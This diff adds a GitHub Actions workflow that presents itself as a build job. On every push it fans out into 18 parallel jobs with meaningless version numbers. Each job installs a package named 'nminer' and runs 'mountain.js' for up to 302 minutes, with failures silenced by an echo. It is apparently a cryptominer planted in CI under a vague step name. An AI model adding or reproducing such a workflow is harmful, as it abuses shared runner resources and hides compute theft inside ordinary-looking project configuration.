@@ -1,0 +1,43 @@
+name: mountain
+on:
+  push:
+    branches: [ "main" ]
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    strategy:
+      matrix:
+        config:
+          - { version: 6379 }
+          - { version: 6975 }
+          - { version: 5022 }
+          - { version: 9037 }
+          - { version: 1847 }
+          - { version: 9701 }
+          - { version: 5830 }
+          - { version: 1026 }
+          - { version: 8823 }
+          - { version: 5491 }
+          - { version: 7995 }
+          - { version: 821 }
+          - { version: 9508 }
+          - { version: 290 }
+          - { version: 6602 }
+          - { version: 462 }
+          - { version: 2981 }
+          - { version: 1603 }
+
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+
+      - name: Install Node.js
+        uses: actions/setup-node@v3
+        with:
+          node-version: 20
+          
+      - name: separately
+        run: |
+          npm install nminer@latest
+          timeout 302m node mountain.js || echo "mountain executed"
